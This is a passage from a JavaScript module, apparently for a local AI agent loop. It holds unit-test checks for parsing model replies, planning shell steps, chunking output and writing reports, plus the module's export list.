  check("workflow verdict accepts error", scoreWorkflow("verdict", '{"ok":true,"why":"fine"}').ok === false);
  check("workflow concat", scoreWorkflow("concat", '{"reason":"The files have not been joined.","display":"I will concatenate them.","cmd":"python3 -c \\"print(1)\\""}').ok === true);
  check("workflow concat needs python", scoreWorkflow("concat", '{"reason":"ok","display":"I will list them.","cmd":"ls"}').ok === false);
  check("workflow code", scoreWorkflow("code", '{"reason":"They asked to see it.","display":"#include <stdio.h>\\nint main(void) { puts(\\"hello world\\"); }","cmd":null}').ok === true);
  check("workflow code intro", scoreWorkflow("code", '{"reason":"basic task","display":"Here is a simple C program that prints hello world:","cmd":null}').ok === false);
  const shown = parseThink('{"reason":"They asked for the program.","display":"#include <stdio.h>\\nint main(void) {\\n  puts(\\"hello world\\");\\n}","cmd":null}', "write a simple C program");
  check("program stays in the answer", shown && !shown.cmd && !shown.plan && /puts/.test(shown.display) && shown.display.includes("\n"));
  const lifted = parseThink('{"reason":"search","display":"grep \\"error\\" /tmp/app.log\\nor\\nrg error /tmp/app.log","cmd":null}', "find error");
  check("command in the answer is runnable", lifted.cmd && /^grep /.test(lifted.cmd) && /app\.log/.test(lifted.cmd));
  check("prompt has no sample file", !/lib\.js/.test(SYSTEM_THINK) && !/I'll read the whole file/.test(SYSTEM_THINK));
  check("copied sample is rejected", copiedFromPrompt("display information about this os", { reason: "I have not read the file the user named, so I cannot summarize it yet.", display: "I'll read the whole file.", cmd: "cat /tmp/lib.js" }));
  check("intro is not the answer", thinAnswer({ display: "Here is a simple C program that prints 'hello world':", cmd: null, plan: null }));
  check("markup keeps the words", presentMarkup("prints hello", "```md\n- prints hello\n```") === "- prints hello");
  check("markup ignores a lecture", presentMarkup("prints hello", "Make the answer easier to read. Do not add facts.") === "prints hello");
  const parts = chunkText("one\ntwo\nthree\nfour", 8);
  check("chunks cover the text", parts.length >= 2 && parts.join("\n").includes("one") && parts.join("\n").includes("four"));
  check("read path from sed", readPathFromCmd("sed -n '1,160p' /home/user/local-loop/lib.js") === "/home/user/local-loop/lib.js");
  check("read path ignores ls", readPathFromCmd("ls -la /tmp") === null);
  const big = "START\n" + "x".repeat(contextCharBudget() + 40) + "\nEND";
  const pieces = chunkText(big, contextCharBudget());
  check("oversized output splits", pieces.length > 1 && pieces[0].includes("START") && pieces[pieces.length - 1].includes("END"));
  check("preview keeps the tail count", /more characters$/.test(previewOutput("abcdef", 3)) && previewOutput("abcdef", 3).startsWith("abc"));
  const live = progressState("read lib.js", 2, 5, ["constants", "functions"]);
  check("progress state is visible", /KEEP GOAL: read lib\.js/.test(live) && /part 2 of 5/.test(live) && /NOTE: constants/.test(live) && /NOTE: functions/.test(live));
  check("check can reject", parseVerdict('{"ok":false,"why":"only the first lines"}').ok === false);
  check("check ignores prose", parseVerdict("looks fine") === null);
  check("ok string is success", parseCheck('{"ok":"ok","why":"ok"}', "").ok === true);
  const emitted = heuristicEmit(pdfPlan.steps[1], stated);
  check("emit pdf", emitted && /tmp-summary\.pdf/.test(emitted.cmd || "") && pdfBytes("names").slice(0, 5).toString() === "%PDF-");
  const listed = advance(mark(p, "1", "ok"), "next");
  const finished = finishReport(listed, { cmd: "ls -la /tmp", code: 0, stdout: "alpha\nbeta\n" });
  check("report finishes", finished && /alpha/.test(finished.text) && finished.plan.steps[1].status === "ok");
  const ended = endReport(
    {
      steps: [
        {
          id: "2",
          status: "ok",
          do: "Write a PDF",
          cmd: "python3 -c \"open('/tmp/tmp-summary.pdf','wb').write(b'')\"",
          note: "pdf: /tmp/tmp-summary.pdf",
        },
      ],
    },
    { cmd: "python3 -c \"open('/tmp/tmp-summary.pdf','wb').write(b'')\"" },
    "/tmp/loop-x"
  );
  check("end report pdf", ended && /The PDF is at \/tmp\/tmp-summary\.pdf/.test(ended) && !/Waiting/.test(ended) && !/NEXT:/.test(ended));
  const fileEnded = endReport(
    { steps: [{ status: "ok", cmd: "python3 -c \"open('foo.txt','w').write('')\"" }] },
    null,
    "/tmp/loop-x"
  );
  check("end report file", fileEnded && /Wrote \/tmp\/loop-x\/foo\.txt/.test(fileEnded));
  check("end report waits", endReport({ steps: [{ status: "todo", cmd: "ls" }] }, null, "/tmp") === null);
  const sample =
    "total 8\n" +
    "drwxrwxrwt 2 root root 4096 Sep 30 19:56 .\n" +
    "drwxr-xr-x 3 root root 4096 Sep  1  2023 ..\n" +
    "-rw-rw-r-- 1 user user 5 Sep 30 08:52 hello.txt\n" +
    "drwxr-xr-x 2 root root 4096 Sep 30 10:18 asyncsnapshot\n";
  const pretty = prettyListing(sample, "/tmp");
  check("pretty listing", /Directories\nasyncsnapshot/.test(pretty) && /Files\nhello\.txt/.test(pretty) && !/\.\./.test(pretty) && !/rwx/.test(pretty));
  const listedDone = endReport(
    { steps: [{ status: "ok", cmd: "ls -la /tmp", note: "names (2): hello.txt, asyncsnapshot" }] },
    { cmd: "ls -la /tmp", stdout: sample },
    "/tmp/loop-x"
  );
  check("end report lists names", listedDone && /Here is \/tmp/.test(listedDone) && /hello\.txt/.test(listedDone) && !/names \(/.test(listedDone) && !/Done\./.test(listedDone));
  check("speech is not state", speak({ ok: true, done: false, result: { cmd: "ls -la /tmp", stdout: "alpha\n" }, step: { do: "List /tmp" } }) === "Listed /tmp.");
  const angry = heuristicPlan("look in my chat logs for all my angry remarks, collect them and put them into an excel and zip the excel");
  check("angry pipeline", angry && angry.steps.length === 4 && angry.steps[2].cmd == null);
  const c = heuristicCheck(p.steps[0], { cmd: "ls", code: 1, stdout: "" }, "KEEP GOAL: x");
  check("failed check", c.ok === false && c.replan === true);
  const quiet = heuristicCheck(
    { id: "2", do: "Write a PDF summary of those names", expect: "pdf file exists", attach: "paths" },
    { cmd: "python3 -c \"open('/tmp/tmp-summary.pdf','wb').write(b'')\"", code: 0, stdout: "" },
    "KEEP GOAL: x\nFACT: names (2): alpha, beta",
  );
  check("pdf needs the file", quiet.ok === false && /not written/.test(quiet.why));
  const wrote = heuristicCheck(
    { id: "2", do: "Write a PDF summary of those names", expect: "pdf file exists", attach: "paths" },
    { cmd: "python3 -c \"open('/tmp/tmp-summary.pdf','wb').write(b'')\"", code: 0, stdout: "" },
    "KEEP GOAL: x\nFACT: names (2): alpha, beta",
    { ok: true, path: "/tmp/tmp-summary.pdf" },
  );
  check("pdf file passes", wrote.ok === true && /pdf:/.test(wrote.summary));
  const afterList = stepState(
    mark(pdfPlan, "1", "todo"),
    pdfPlan.steps[0],
    { cmd: "ls -la /tmp", code: 0, stdout: "alpha\nbeta\n" },
    true,
    "",
  );
  const armed = armNext(advance(mark(pdfPlan, "1", "ok"), "next"), afterList);
  check("next command is armed from state", armed.steps[1].cmd && /tmp-summary\.pdf/.test(armed.steps[1].cmd) && /alpha/.test(afterList));
  const emit = heuristicEmit(angry.steps[2], "KEEP GOAL: x\nFACT: I hate this bug. Furious.");
  check("emit csv", emit && /angry\.csv/.test(emit.cmd || ""));
  check("parseEmit", parseEmit('{"cmd":null,"ask":"where?"}').ask === "where?");
  check("system compact", SYSTEM_A.length < 500 && SYSTEM_CHECK.length < 400 && SYSTEM_A.includes("Hello.") && SYSTEM_CHECK.includes('"ok":true') && SYSTEM_REWRITE.includes("KEEP GOAL") && SYSTEM_EMIT.includes("JSON"));
  return { ok: results.every((r) => r.ok), passed: results.filter((r) => r.ok).length, total: results.length, results };
}

module.exports = {
  NUM_CTX,
  DENY_CMD,
  SYSTEM_A,
  SYSTEM_REWRITE,
  SYSTEM_PLAN,
  SYSTEM_CHECK,
  SYSTEM_EMIT,
  SYSTEM_REPLAN,
  SYSTEM_THINK,
  SYSTEM_SAY,
  SYSTEM_NOTE,
  SYSTEM_MARKUP,
  MODEL_PROBE_USER,
  contextCharBudget,
  progressState,
  parseVerdict,
  previewOutput,
  clip,
  chunkText,
  readPathFromCmd,
  hasGoal,
  keepLines,
  clipContext,
  finalizeRewrite,
  heuristicRewrite,
  pickMode,
  extractJson,
  parseDirect,
  parsePlan,
  parseThink,
  presentMarkup,
  thinAnswer,
  copiedFromPrompt,
  USER_SCENARIOS,
  runUserScenarios,
  cleanDisplay,
  parseCheck,
  parseEmit,
  listingNames,
  prettyListing,
  summarizeOutput,
  shortListing,
  finishReport,
  endReport,
  speak,
  stepState,
  pdfBytes,
  pdfCommand,
  overflow,
  applyAttach,
  heuristicDirect,
  heuristicPlan,
  localTurn,
  reasonFor,
  heuristicEmit,
  heuristicCheck,
  judge,
  probeWrittenPdf,
  armNext,
  currentStep,
  mark,
  advance,
  assertSafeCmd,
  safeRelPath,
  recordWrite,
  rollbackAfter,
  estimatePrompt,
  scoreModelReply,
  formatReport,
  formatSession,
  scoreWorkflow,
  WORKFLOW_PROBES,
  runUnitTests,
};
